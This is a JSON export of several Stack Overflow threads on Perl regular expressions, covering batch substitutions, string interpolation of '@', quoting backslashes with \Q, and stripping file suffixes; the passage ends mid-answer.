[{"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1455142597, "post_id": 35327007, "comment_id": 58362741, "body": "This is hard to answer without a specific example. If you&#39;re talking about doing <code>s&#47;a&#47;A&#47;</code>, <code>s&#47;b&#47;B&#47;</code>, <code>s&#47;c&#47;C&#47;</code>, etc. then I would use <code>tr&#47;&#47;&#47;</code>; with slightly more complex regexes, I might combine them into a single regex, either &quot;manually&quot; or with <code>join &#39;|&#39;, @patterns</code> or something like that; in other cases, I would do something else."}, {"owner": {"reputation": 1497, "user_id": 4987223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0850ea3162cafc96ef345404cf7dcca0?s=128&d=identicon&r=PG&f=1", "display_name": "vmachan", "link": "https://stackoverflow.com/users/4987223/vmachan"}, "edited": false, "score": 0, "creation_date": 1455142804, "post_id": 35327007, "comment_id": 58362818, "body": "I think the <a href=\"http://stackoverflow.com/questions/19658769/perl-how-to-supply-regexp-list-from-file\">second answer in this SO post</a> is what you are looking for.."}, {"owner": {"reputation": 197, "user_id": 5253336, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/9816da99c833fc2df2b3524db2413253?s=128&d=identicon&r=PG&f=1", "display_name": "Erik Olson", "link": "https://stackoverflow.com/users/5253336/erik-olson"}, "edited": false, "score": 0, "creation_date": 1455142819, "post_id": 35327007, "comment_id": 58362824, "body": "Thanks, ThisSuitIsBlackNot. My applications are a little specialized but I will try to give a specific example. One instance is a long RTF file with code for a TV teleprompter such as &quot;SOV----------&quot; and other ugly commands that I individually get rid of, leaving only the actual text content. So that&#39;s why I can&#39;t just condense several s/// into one."}, {"owner": {"reputation": 32690, "user_id": 3266847, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/U0oyt.png?s=128&g=1", "display_name": "Benjamin W.", "link": "https://stackoverflow.com/users/3266847/benjamin-w"}, "edited": false, "score": 1, "creation_date": 1455143099, "post_id": 35327007, "comment_id": 58362942, "body": "I&#39;ve never tried it, but maybe <a href=\"http://search.cpan.org/~rsavage/Regexp-Assemble-0.36/lib/Regexp/Assemble.pm\" rel=\"nofollow noreferrer\"><code>Regex::Assemble</code></a> would be useful."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1455143279, "post_id": 35327007, "comment_id": 58363039, "body": "Since 5.10, Regex::Assemble is redundant with <code>join &#39;|&#39;</code>"}, {"owner": {"reputation": 83048, "user_id": 2255089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZNAsT.jpg?s=128&g=1", "display_name": "Casimir et Hippolyte", "link": "https://stackoverflow.com/users/2255089/casimir-et-hippolyte"}, "edited": false, "score": 0, "creation_date": 1455144353, "post_id": 35327007, "comment_id": 58363520, "body": "You speak about a dozen and dozen of replacements, sometimes formats seem ugly because man takes not the time to see their structure with more precision. It&#39;s the most important step of the job."}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1455147857, "post_id": 35327007, "comment_id": 58364904, "body": "This question isn&#39;t so bad to deserve the downvote and the close votes (IMHO), but it would benefit from some specific examples of what the OP is trying to do."}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455151442, "post_id": 35327160, "comment_id": 58366040, "body": "I don&#39;t think that helps a lot without an example. I realise that the OP has offered no sample data, but it would have been best to ask for something before writing a very generic solution"}], "tags": [], "owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "is_accepted": false, "score": 2, "last_activity_date": 1455143014, "creation_date": 1455143014, "answer_id": 35327160, "question_id": 35327007, "link": "https://stackoverflow.com/questions/35327007/alternative-to-many-substitutions-in-a-row/35327160#35327160", "title": "Alternative to many substitutions in a row?", "body": "<p>Sometimes the most efficient approach is to parse the old data format into a memory structure and then output the new format.</p>\n\n<p>Depending on the structure, this can be done line by line. But if you have to do the whole document that works, as long as they aren't too gigantic.</p>\n\n<p>As an example, this is how you'd do an image file conversion: read a GIF into a bitmap and then produce a JPEG output. You wouldn't use regular expressions, even if you <em>could</em>, it would be horribly inefficient.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1455157018, "last_edit_date": 1455157018, "creation_date": 1455143022, "answer_id": 35327162, "question_id": 35327007, "link": "https://stackoverflow.com/questions/35327007/alternative-to-many-substitutions-in-a-row/35327162#35327162", "title": "Alternative to many substitutions in a row?", "body": "<p>Zan Lynx gives good advice, but to answer your question about hash-driven substitutions, you can use the following:</p>\n\n<pre><code>my %replacements = (\n   foo =&gt; 'bar',\n   bar =&gt; 'baz',\n   baz =&gt; 'foo',\n   # ...\n);\n\nmy $pat = join '|', map quotemeta, keys %replacements;\n\ns/($pat)/$replacements{$1}/g;\n</code></pre>\n\n<p>This solves two problems:</p>\n\n<ul>\n<li>It scans the input only once, not once per pattern.</li>\n<li>It takes away the risk of accidentally matching the replacements of earlier substitutions. In fact, the example I used couldn't be accomplished with three substitutions.</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 4035, "user_id": 708333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d44c2c40695f724c785ff3c2816232d3?s=128&d=identicon&r=PG&f=1", "display_name": "TimK", "link": "https://stackoverflow.com/users/708333/timk"}, "is_accepted": false, "score": 1, "last_activity_date": 1533837277, "last_edit_date": 1533837277, "creation_date": 1455145259, "answer_id": 35327700, "question_id": 35327007, "link": "https://stackoverflow.com/questions/35327007/alternative-to-many-substitutions-in-a-row/35327700#35327700", "title": "Alternative to many substitutions in a row?", "body": "<p>I have a utility method I use all the time for this:</p>\n\n<pre><code>sub subst($@) {\n    my($x, @map) = @_;\n    @map % 2 == 0 or die 'subst requires an odd number of params';\n    while (@map) {\n        my $from = shift(@map);\n        my $to = shift(@map);\n        $x =~ s/$from/$to/g;\n    }\n    return $x;\n}\n</code></pre>\n\n<p>I use a list instead of a hash for <code>map</code> so I can control the order. Use it like this:</p>\n\n<pre><code>my $new_x = subst($x,\n    pattern1 =&gt; replacement1,\n    pattern2 =&gt; replacement2);\n</code></pre>\n\n<p>Even with a single pattern, it's simpler if you aren't substituting something in place. I.e. it's cleaner than this:</p>\n\n<pre><code>my $new_x = $x;\n$new_x =~ s/pattern1/replacement1/g;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": -2, "last_activity_date": 1455151105, "creation_date": 1455151105, "answer_id": 35328784, "question_id": 35327007, "link": "https://stackoverflow.com/questions/35327007/alternative-to-many-substitutions-in-a-row/35328784#35328784", "title": "Alternative to many substitutions in a row?", "body": "<p>This is an awkward question because the <em>order</em> of the substitutions affects the result</p>\n\n<p>If your changes are so extensive then I would much prefer a sequence of <code>s///</code> statements to anything held in a hash, which would shuffle the substitutions into a different order each time the program was run</p>\n\n<p>I would still be worried about the accuracy of <em>\u201cdozens and dozens\u201d</em> (two hundred plus?) of substitutions, but at least the result would be under control</p>\n"}], "owner": {"reputation": 197, "user_id": 5253336, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/9816da99c833fc2df2b3524db2413253?s=128&d=identicon&r=PG&f=1", "display_name": "Erik Olson", "link": "https://stackoverflow.com/users/5253336/erik-olson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "closed_date": 1455151666, "answer_count": 4, "score": 0, "last_activity_date": 1533837277, "creation_date": 1455142459, "question_id": 35327007, "link": "https://stackoverflow.com/questions/35327007/alternative-to-many-substitutions-in-a-row", "closed_reason": "Needs more focus", "title": "Alternative to many substitutions in a row?", "body": "<p>Most of my Perl scripts deal with converting ugly formats to the plain TXT content. So far, I've done this with dozens and dozens of substitutions all in a row. Is there a more elegant way to do this in Perl? For instance, a hash containing all the s/// pairs, or even an external file containing the substitutions? </p>\n\n<p>I'm just wondering how other people handle this kind of formatting script, or if just having a novel's worth of s/// expressions is the normal way to go. It gets hard to manage at a certain point.</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1455139503, "post_id": 35326150, "comment_id": 58361228, "body": "This is why you should turn on warnings, even for one-liners. <code>perl -wE&#39;say &quot;foo@bar&quot;&#39;</code> gives &#39;Name &quot;main::bar&quot; used only once: possible typo at -e line 1.&#39;"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1455139552, "post_id": 35326150, "comment_id": 58361256, "body": "It&#39;s only because you&#39;re using <code>@</code> inside a double-quoted string and <code>@tiefighter</code> could be a valid variable name to interpolate. If you&#39;re getting your input from somewhere else, you&#39;ll be fine."}], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1455139658, "post_id": 35326261, "comment_id": 58361316, "body": "In real code, you would also have strict and warnings enabled, so you&#39;d get a compile error (unless <code>@tiefighter</code> is defined)."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1455139770, "post_id": 35326261, "comment_id": 58361381, "body": "IMO, using the <code>q&#47;&#47;</code> quoting would be cleaner inside a one-liner, even though it&#39;s kind of a moot point."}, {"owner": {"reputation": 3590, "user_id": 2066468, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/c3d95d4d4529fc0d8169cf4844db5369?s=128&d=identicon&r=PG", "display_name": "Dirty Penguin", "link": "https://stackoverflow.com/users/2066468/dirty-penguin"}, "edited": false, "score": 0, "creation_date": 1455139802, "post_id": 35326261, "comment_id": 58361404, "body": "Ah okay. I didn&#39;t realize there was a distinction in statically declaring a string in double quotes vs a string from a file/stream."}, {"owner": {"reputation": 36625, "user_id": 2449905, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zBnOo.jpg?s=128&g=1", "display_name": "Dan Lowe", "link": "https://stackoverflow.com/users/2449905/dan-lowe"}, "reply_to_user": {"reputation": 3590, "user_id": 2066468, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/c3d95d4d4529fc0d8169cf4844db5369?s=128&d=identicon&r=PG", "display_name": "Dirty Penguin", "link": "https://stackoverflow.com/users/2066468/dirty-penguin"}, "edited": false, "score": 0, "creation_date": 1455140313, "post_id": 35326261, "comment_id": 58361690, "body": "@DirtyPenguin I expanded the answer to include some examples of how string interpolation works with different quoting and escaping and variable types."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1455140442, "post_id": 35326261, "comment_id": 58361752, "body": "Hashes don&#39;t interpolate. See <a href=\"http://perldoc.perl.org/perldata.html#Scalar-value-constructors\" rel=\"nofollow noreferrer\">perldata</a>: &quot;Variable substitution inside strings is limited to scalar variables, arrays, and array or hash slices. (In other words, names beginning with <code>$</code> or <code>@</code>, followed by an optional bracketed expression as a subscript.)&quot;"}, {"owner": {"reputation": 36625, "user_id": 2449905, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zBnOo.jpg?s=128&g=1", "display_name": "Dan Lowe", "link": "https://stackoverflow.com/users/2449905/dan-lowe"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1455140485, "post_id": 35326261, "comment_id": 58361775, "body": "@ThisSuitIsBlackNot Thanks for the reminder. I updated the answer to remove mention of hashes."}, {"owner": {"reputation": 3590, "user_id": 2066468, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/c3d95d4d4529fc0d8169cf4844db5369?s=128&d=identicon&r=PG", "display_name": "Dirty Penguin", "link": "https://stackoverflow.com/users/2066468/dirty-penguin"}, "edited": false, "score": 0, "creation_date": 1455140844, "post_id": 35326261, "comment_id": 58361945, "body": "@DanLowe Thank you :)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 3590, "user_id": 2066468, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/c3d95d4d4529fc0d8169cf4844db5369?s=128&d=identicon&r=PG", "display_name": "Dirty Penguin", "link": "https://stackoverflow.com/users/2066468/dirty-penguin"}, "edited": false, "score": 1, "creation_date": 1455144417, "post_id": 35326261, "comment_id": 58363543, "body": "@Dirty Penguin, The key is distinguishing string literals (source code such as <code>&quot;123\\x{34}567&quot;</code>) and the strings they produce (values such as <code>1234567</code>)."}], "tags": [], "owner": {"reputation": 36625, "user_id": 2449905, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zBnOo.jpg?s=128&g=1", "display_name": "Dan Lowe", "link": "https://stackoverflow.com/users/2449905/dan-lowe"}, "is_accepted": true, "score": 5, "last_activity_date": 1455145681, "last_edit_date": 1455145681, "creation_date": 1455139562, "answer_id": 35326261, "question_id": 35326150, "link": "https://stackoverflow.com/questions/35326150/perl-escaping-meta-characters-in-split/35326261#35326261", "title": "Perl: Escaping meta characters in split", "body": "<p>This is an artifact of specifying the string in the code. The <code>@</code> sigil in perl indicates an array, and in a double-quoted string, this gets expanded (or tries to expand, even if <code>@tiefighter</code> does not exist).</p>\n\n<p>You can fix either with the backslash, as you already found, or by quoting differently so it's a single-quoted string (thus, not interpolated).</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>perl -e '$string = q{leia@tiefighter.com}; @parts = split(/\\@/, $string); print \"Domain: $parts[-1]\\n\";'\n</code></pre>\n\n<p>In real code, you probably aren't statically writing these strings out, and this probably won't be an issue in the first place.</p>\n\n<p>To elaborate on Perl's interpolation: single-quoted values are not interpolated, and double-quoted values are.</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>$a = 'abc';\n@b = ('abc', 'def');\n\n$foo = 'bar$a';           # 'bar$a'\n$foo = \"bar$a\";           # 'barabc'\n\n$foo = 'bar@b';           # 'bar@b'\n$foo = \"bar@b\";           # 'barabc def'\n</code></pre>\n\n<p>You can get around these problems using proper quoting. Either use single-quoted strings, or alternately you can escape the sigils inside of double-quoted strings.</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>$foo = \"bar\\$a\";\n$foo = \"bar\\@b\";\n</code></pre>\n\n<p><code>q{}</code> is equivalent to single-quotes as well.</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>$foo = q{bar$a bar@b};\n</code></pre>\n\n<p>Of course, like I said, in real code, probably something else is taking care of getting the special symbols into your string, and you won't be writing them out explicitly like this. But in cases where you do need to write things out explicitly, this is how to handle it.</p>\n"}], "owner": {"reputation": 3590, "user_id": 2066468, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/c3d95d4d4529fc0d8169cf4844db5369?s=128&d=identicon&r=PG", "display_name": "Dirty Penguin", "link": "https://stackoverflow.com/users/2066468/dirty-penguin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 430, "favorite_count": 0, "accepted_answer_id": 35326261, "answer_count": 1, "score": 1, "last_activity_date": 1455145681, "creation_date": 1455139275, "question_id": 35326150, "link": "https://stackoverflow.com/questions/35326150/perl-escaping-meta-characters-in-split", "title": "Perl: Escaping meta characters in split", "body": "<p>I'm trying to use <code>split()</code> to extract the value <code>tiefighter.com</code> from <code>leia@tiefighter.com</code>. I found that if the <code>@</code> character in my input string is escaped, I get the expected output:</p>\n\n<pre><code>$ perl -e '$string = \"leia\\@tiefighter.com\"; @parts = split(/\\@/, $string); print \"Domain: $parts[-1]\\n\";'\nDomain: tiefighter.com\n</code></pre>\n\n<p>However, if I do not escape the <code>@</code> character, I get this:</p>\n\n<pre><code>$ perl -e '$string = \"leia@tiefighter.com\"; @parts = split(/\\@/, $string); print \"Domain: $parts[-1]\\n\";' \nDomain: leia.com\n</code></pre>\n\n<p>Given that I cannot anticipate the input string, what is the correct way to split on the <code>@</code>?</p>\n"}, {"tags": ["regex", "perl", "backslash"], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 4, "last_activity_date": 1455138799, "creation_date": 1455138799, "answer_id": 35326004, "question_id": 35325841, "link": "https://stackoverflow.com/questions/35325841/replacing-text-with-backslashes-with-perl-substitution-command/35326004#35326004", "title": "Replacing text with backslashes with perl substitution command", "body": "<p>Using <a href=\"http://p3rl.org/warnings\" rel=\"nofollow\">warnings</a> would have told you:</p>\n\n<pre><code>Unrecognized escape \\T passed through in regex; marked by &lt;-- HERE in m/\\T &lt;-- HERE ext/ at ...\n</code></pre>\n\n<p><code>$oldText = \"\\\\Text\"</code> assigns the string <code>\\Text</code> to $oldText, so the two substitutions aren't equivalent. Use <code>\\Q</code> (see <a href=\"http://p3rl.org/quotemeta\" rel=\"nofollow\">quotemeta</a>) to quote the contents of a variable:</p>\n\n<pre><code>$ln =~ s/\\Q$oldText/newText/;\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 5910574, "user_type": "registered", "profile_image": "https://graph.facebook.com/10205877263599118/picture?type=large", "display_name": "Kevin Dunn", "link": "https://stackoverflow.com/users/5910574/kevin-dunn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 340, "favorite_count": 0, "accepted_answer_id": 35326004, "answer_count": 1, "score": 0, "last_activity_date": 1455138799, "creation_date": 1455138163, "last_edit_date": 1455138313, "question_id": 35325841, "link": "https://stackoverflow.com/questions/35325841/replacing-text-with-backslashes-with-perl-substitution-command", "title": "Replacing text with backslashes with perl substitution command", "body": "<p>So I was working on a perl script that does substitution commands on input and the input will have backslashes. So just replace some text with new text</p>\n\n<p>For example, if the input was</p>\n\n<pre><code>\"\\text\"\n</code></pre>\n\n<p>I might output</p>\n\n<pre><code>\"newText\"\n</code></pre>\n\n<p>Note that the slash is removed.</p>\n\n<p>Here is some code that does that:</p>\n\n<pre><code>$oldText = \"\\\\Text\";\n\nwhile (&lt;STDIN&gt;) {                \n    $ln = $_;                     \n    $ln2 = $_;\n    $ln2 =~ s/\\\\Text/newText/;  \n    $ln =~ s/$oldText/newText/;\n}\nprint \"$ln\\n\";\nprint \"$ln2\\n\";\n</code></pre>\n\n<p>When the input is \"Text\" the output is</p>\n\n<pre><code>\\newText #Incorrect because the \\ is still there\n\nnewText #Correct\n</code></pre>\n\n<p>Can anyone explain why using the string instead of a variable changes the output to be what I want? I'm aware that \\ derefences the following character, and that is likely the source of the issue. But I can't fathom why having using a variable changes the output. Changing the variable oldText to be \"\\text\" doesn't change the output.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1455122493, "post_id": 35320861, "comment_id": 58350618, "body": "Do you mean to take the last two parts separated by a period?"}, {"owner": {"reputation": 3751, "user_id": 3982001, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Fabio says Reinstate Monica", "link": "https://stackoverflow.com/users/3982001/fabio-says-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1455122552, "post_id": 35320861, "comment_id": 58350681, "body": "&quot;Till the second to last occurrance&quot; of what? Letters followed by a dot? More examples would help."}, {"owner": {"reputation": 3, "user_id": 5875602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fe91e63b0af1a012c4dd5516fe42a0d?s=128&d=identicon&r=PG&f=1", "display_name": "Bobby McMillan", "link": "https://stackoverflow.com/users/5875602/bobby-mcmillan"}, "edited": false, "score": 0, "creation_date": 1455122760, "post_id": 35320861, "comment_id": 58350858, "body": "For example: rrr.abc.txy.html I would like to obtain everything before .txy.html"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455134690, "post_id": 35320861, "comment_id": 58358554, "body": "I think you need to show more code. <i>&quot;I have rrr.abc.tsy.html&quot;</i> tells us very little, Are those fields in a Perl array or in a single Perl string? If you can publish the code that created those values then we would be able to help much better"}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1455195481, "post_id": 35321073, "comment_id": 58387091, "body": "<code>s&#47;^(.+)(\\.[^.]+){2}$&#47;\\1&#47;</code> can be simplified to <code>s&#47;(?:\\.[^.]+){2}\\z&#47;&#47;</code>. And that <code>+</code> should probably be <code>*</code>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1455195663, "post_id": 35321073, "comment_id": 58387217, "body": "<code>$str =~ &#47;^(.+)(\\.[^.]+){2}$&#47;; my $match = $1;</code> is buggy. <code>$match</code> contains something unknown if the match fails. <code>my ($match) = $str =~ &#47;^(.+)(\\.[^.]+){2}$&#47;;</code> avoids that problems. Better yet, <code>my ($match) = $str =~ &#47;^(.*)(\\.[^.]*){2}\\z&#47;;</code>"}, {"owner": {"reputation": 36625, "user_id": 2449905, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zBnOo.jpg?s=128&g=1", "display_name": "Dan Lowe", "link": "https://stackoverflow.com/users/2449905/dan-lowe"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1455200498, "post_id": 35321073, "comment_id": 58390787, "body": "@ikegami The <code>+</code> is there instead of <code>*</code> on purpose to avoid matching <code>&#39;.foo.bar&#39;</code> and returning <code>&#39;&#39;</code>. In any case I&#39;m not going to refine this further unless the OP updates the question, due to current hold for unclear..."}], "tags": [], "owner": {"reputation": 36625, "user_id": 2449905, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zBnOo.jpg?s=128&g=1", "display_name": "Dan Lowe", "link": "https://stackoverflow.com/users/2449905/dan-lowe"}, "is_accepted": true, "score": 1, "last_activity_date": 1455122800, "creation_date": 1455122800, "answer_id": 35321073, "question_id": 35320861, "link": "https://stackoverflow.com/questions/35320861/regex-to-obtain-everything-till-the-second-to-last-occurrence/35321073#35321073", "title": "Regex to obtain everything till the second to last occurrence", "body": "<p>To modify the string itself to strip the latter portion:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>my $str = 'rrr.abc.tsy.html';\n$str =~ s/^(.+)(\\.[^.]+){2}$/\\1/;\n</code></pre>\n\n<p>Or you can leave the string alone and simply grab the matching portion in another variable:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>$str =~ /^(.+)(\\.[^.]+){2}$/;\nmy $match = $1;\n</code></pre>\n\n<p>Explanation of regular expression:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>^               Match at beginning of string\n(               Start capturing group 1\n    .+              1 or more of any character (except newline)\n)               End capturing group 1\n(               Start capturing group 2\n    \\.              A single literal period\n    [^.]+           1 or more of any character except period or newline\n)               End capturing group 2\n{2}             Match exactly 2 of the stuff in capturing group 2\n$               Match at end of string\n</code></pre>\n\n<p>The second capturing group and its 2 multipler <code>(\\.[^.]+){2}</code> matches the last two suffixes.</p>\n\n<p>The first group, being \"greedy,\" matches everything it can before then.</p>\n"}, {"tags": [], "owner": {"reputation": 3751, "user_id": 3982001, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Fabio says Reinstate Monica", "link": "https://stackoverflow.com/users/3982001/fabio-says-reinstate-monica"}, "is_accepted": false, "score": -1, "last_activity_date": 1455123003, "creation_date": 1455123003, "answer_id": 35321154, "question_id": 35320861, "link": "https://stackoverflow.com/questions/35320861/regex-to-obtain-everything-till-the-second-to-last-occurrence/35321154#35321154", "title": "Regex to obtain everything till the second to last occurrence", "body": "<pre><code>^(.+)[.][^.]*[.][^.]*$\n</code></pre>\n\n<p>Explanation:\nIt will match<br>\n<code>^</code> from the beginning<br>\n<code>(.+)</code> a group of any length of any characters<br>\n<code>[.]</code> that are followed by a dot,<br>\n<code>[^.]*</code> then optionally by some non-dot characters,<br>\n<code>[.]</code>then by another dot<br>\n<code>[^.]*</code> and optionally by other non-dot characters<br>\n<code>$</code> until the end</p>\n\n<p>The result will be captured in variable <code>$1</code>.</p>\n\n<p>The question is unfortunately not clear enough to understand whether the groups of non-dot characers have to be optional or not.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1455136799, "last_edit_date": 1455136799, "creation_date": 1455123960, "answer_id": 35321503, "question_id": 35320861, "link": "https://stackoverflow.com/questions/35320861/regex-to-obtain-everything-till-the-second-to-last-occurrence/35321503#35321503", "title": "Regex to obtain everything till the second to last occurrence", "body": "<blockquote>\n  <p><em>I would like to obtain everything before .txy.htm</em></p>\n</blockquote>\n\n<pre><code>my $s = 'rrr.abc.txy.html';\nmy ($wanted) = $s =~ /^(.*?)\\.txy\\.html/;\nsay $wanted;  # rrr.abc\n</code></pre>\n\n<p>If instead you want to remove any trailing <code>.txy.htm</code>,</p>\n\n<pre><code>my $s = 'rrr.abc.txy.html';\n$s =~ s/\\.txy\\.html\\z//;\nsay $s;  # 